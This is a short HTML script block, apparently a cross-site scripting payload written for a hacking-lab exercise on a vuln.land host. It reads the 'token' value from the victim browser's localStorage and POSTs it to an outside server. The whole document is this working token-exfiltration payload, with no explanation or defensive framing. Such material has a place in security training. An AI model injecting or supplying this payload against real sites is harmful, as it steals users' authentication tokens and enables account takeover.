<script>    
var xhr1 = new XMLHttpRequest();
var token = localStorage.getItem('token');
xhr1.open("POST", "https://b053d50b-2433-4d59-bde3-3bb038c3ab70.idocker.vuln.land//abcd");
xhr1.setRequestHeader("Content-Type", "application/x-www-form-urlencoded"); 
xhr1.send(`token=${token}`);
</script>